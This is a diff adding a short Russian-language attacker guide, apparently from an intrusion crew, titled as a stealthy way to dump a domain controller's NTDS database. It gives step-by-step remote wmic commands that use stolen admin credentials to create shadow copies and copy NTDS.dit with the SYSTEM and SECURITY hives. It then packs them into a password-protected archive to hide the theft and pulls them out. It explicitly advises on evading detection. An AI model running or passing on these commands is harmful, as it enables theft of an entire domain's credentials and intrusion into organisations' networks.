@@ -1,0 +1,37 @@
+Способ беспалевного ДАМПА НТДС 
+shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c vssadmin list shadows >> c:\log.txt"
+
+
+делаем запрос на листинг шэдоу копий, там есть указание даты, проверьте чтобы была свежая дата
+почти наверняка они там уже есть, если нет то делаем сами
+
+net start Volume Shadow Copy
+shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
+
+
+далее в листинге шэдоу копий находим самую свежую
+Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55
+соответственно нам нужен номер копии для следующей команды
+
+
+shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\NTDS\NTDS.dit c:\temp\log\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SYSTEM c:\temp\log\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SECURITY c:\temp\log\"
+
+
+в c:\temp\log\ должны упасть файлы ntds.dit / security / system
+берём портативный консольный 7з и пакуем в архив с паролем
+Код: [Выделить]
+
+7za.exe a -tzip -mx5 \\DC01\C$\temp\log.zip \\DC01\C$\temp\log -pTOPSECRETPASSWORD
+
+
+выкачиваем запароленный архив себе, если при декрипте файла нтдс получаем ошибку (файл повреждён), то делаем следующее
+
+
+Esentutl /p C:\log\ntds.dit
+
+
+хитрость этого способа в том, что мы по факту ничего не дампим, мы просто берём и выкачиваем нтдс
+чтобы не спалиться тем что вытаскиваем именно нтдс мы пакуем его в запароленный архив
+
+если у вас траблы с тем, что палят и выкидывают из сети после дампа нтдс - пробуйте этот способ
+его спалить можно только самим фактом какой-то утекающей даты с КД, причём проанализировать что именно вы тащите не зная пароль от архива невозможно
